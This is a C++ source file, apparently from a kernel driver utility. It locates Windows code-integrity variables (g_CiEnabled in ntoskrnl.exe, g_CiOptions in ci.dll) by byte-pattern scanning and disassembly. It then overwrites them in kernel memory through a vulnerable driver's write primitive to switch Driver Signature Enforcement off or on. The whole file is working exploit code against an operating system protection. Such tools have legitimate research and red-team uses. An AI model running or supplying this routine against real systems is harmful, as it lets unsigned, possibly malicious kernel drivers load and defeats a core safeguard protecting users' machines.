/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2021
*
*  TITLE:       DSEFIX.CPP
*
*  VERSION:     1.02
*
*  DATE:        11 Feb 2021
*
*  CI DSE corruption related routines.
*  Based on DSEFix v1.3
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#include "global.h"

/*
* KDUQueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address for Windows 7.
*
*/
LONG KDUQueryCiEnabled(
    _In_ PVOID MappedBase,
    _In_ SIZE_T SizeOfImage,
    _Inout_ ULONG_PTR* KernelBase
)
{
    SIZE_T  c;
    LONG    rel = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)MappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)MappedBase + c + 4);
            *KernelBase = *KernelBase + c + 8 + rel;
            break;
        }
    }

    return rel;
}

/*
* KDUQueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
* Depending on current Windows version it will look for target value differently.
*
*/
LONG KDUQueryCiOptions(
    _In_ HMODULE MappedBase,
    _Inout_ ULONG_PTR* KernelBase,
    _In_ ULONG NtBuildNumber
)
{
    PBYTE        CiInitialize = NULL;
    ULONG        c, j = 0;
    LONG         rel = 0;
    hde64s hs;

    CiInitialize = (PBYTE)GetProcAddress(MappedBase, "CiInitialize");
    if (CiInitialize == NULL)
        return 0;

    if (NtBuildNumber >= NT_WIN10_REDSTONE3) {

        c = 0;
        j = 0;
        do {

            /* call CipInitialize */
            if (CiInitialize[c] == 0xE8)
                j++;

            if (j > 1) {
                rel = *(PLONG)(CiInitialize + c + 1);
                break;
            }

            hde64_disasm(CiInitialize + c, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (c < 256);

    }
    else {

        c = 0;
        do {

            /* jmp CipInitialize */
            if (CiInitialize[c] == 0xE9) {
                rel = *(PLONG)(CiInitialize + c + 1);
                break;
            }
            hde64_disasm(CiInitialize + c, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (c < 256);

    }

    CiInitialize = CiInitialize + c + 5 + rel;
    c = 0;
    do {

        if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
            rel = *(PLONG)(CiInitialize + c + 2);
            break;
        }
        hde64_disasm(CiInitialize + c, &hs);
        if (hs.flags & F_ERROR)
            break;
        c += hs.len;

    } while (c < 256);

    CiInitialize = CiInitialize + c + 6 + rel;

    *KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;

    return rel;
}

/*
* KDUQueryVariable
*
* Purpose:
*
* Find variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR KDUQueryVariable(
    _In_ ULONG NtBuildNumber
)
{
    LONG rel = 0;
    SIZE_T SizeOfImage = 0;
    ULONG_PTR Result = 0, ModuleKernelBase = 0;
    CONST CHAR* szModuleName;
    HMODULE MappedModule;

    CHAR szFullModuleName[MAX_PATH * 2];

    if (NtBuildNumber < NT_WIN8_BLUE) {
        szModuleName = NTOSKRNL_EXE;
    }
    else {
        szModuleName = CI_DLL;
    }

    ModuleKernelBase = supGetModuleBaseByName(szModuleName);
    if (ModuleKernelBase == 0) {
        printf_s("[!] Abort, could not query \"%s\" image base\r\n", szModuleName);
        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
        return 0;

    _strcat_a(szFullModuleName, "\\");
    _strcat_a(szFullModuleName, szModuleName);

    //
    // Preload module for pattern search.
    //
    MappedModule = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (MappedModule) {

        printf_s("[+] Module \"%s\" loaded for pattern search\r\n", szModuleName);

        if (NtBuildNumber < NT_WIN8_BLUE) {
            rel = KDUQueryCiEnabled(
                MappedModule,
                SizeOfImage,
                &ModuleKernelBase);

        }
        else {
            rel = KDUQueryCiOptions(
                MappedModule,
                &ModuleKernelBase,
                NtBuildNumber);
        }

        if (rel != 0) {
            Result = ModuleKernelBase;
        }
        FreeLibrary(MappedModule);
    }
    else {

        //
        // Output error.
        //
        printf_s("[!] Could not load \"%s\", GetLastError %lu\r\n", szModuleName, GetLastError());

    }

    return Result;
}

/*
* KDUControlDSE
*
* Purpose:
*
* Change ntoskrnl.exe g_CiEnabled or CI.dll g_CiOptions state.
*
*/
BOOL KDUControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue
)
{
    BOOL bResult = FALSE;
    ULONG_PTR variableAddress;
    ULONG returnLength = 0;
    NTSTATUS ntStatus;
    SYSTEM_CODEINTEGRITY_INFORMATION state;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    state.CodeIntegrityOptions = 0;
    state.Length = sizeof(state);

    //
    // Query DSE state.
    //

    ntStatus = NtQuerySystemInformation(SystemCodeIntegrityInformation,
        (PVOID)&state, sizeof(SYSTEM_CODEINTEGRITY_INFORMATION),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {

        if (state.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) {
            printf_s("[+] System reports CodeIntegrityOption Enabled\r\n");

            //
            // Check if DSE is enabled so we don't need to enable it again.
            //
            // CI status does not updated on Win7.
            //
            if (Context->NtBuildNumber >= NT_WIN10_THRESHOLD1) {
                if (DSEValue == 6) {
                    printf_s("[!] DSE already enabled, nothing to do, leaving.\r\n");
                    return TRUE;
                }
            }
        }
        else {

            printf_s("[+] System reports CodeIntegrityOption Disabled\r\n");

            //
            // Check if DSE is disabled so we don't need to disable it again.
            //
            if (Context->NtBuildNumber >= NT_WIN10_THRESHOLD1) {

                if (DSEValue == 0) {
                    printf_s("[!] DSE already disabled, nothing to do, leaving.\r\n");
                    return TRUE;
                }
            }
        }

    }

    //
    // Assume variable is in nonpaged .data section.
    //

    variableAddress = KDUQueryVariable(Context->NtBuildNumber);
    if (variableAddress == 0) {
        printf_s("[!] Could not query system variable address, abort.\r\n");
    }
    else {

        printf_s("[+] Corrupting DSE value at 0x%p address\r\n", (PVOID)variableAddress);

        bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
            variableAddress,
            &DSEValue,
            sizeof(DSEValue));

        printf_s("%s Kernel memory %s\r\n",
            (bResult == FALSE) ? "[!]" : "[+]",
            (bResult == FALSE) ? "not patched" : "patched");
    }


    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}
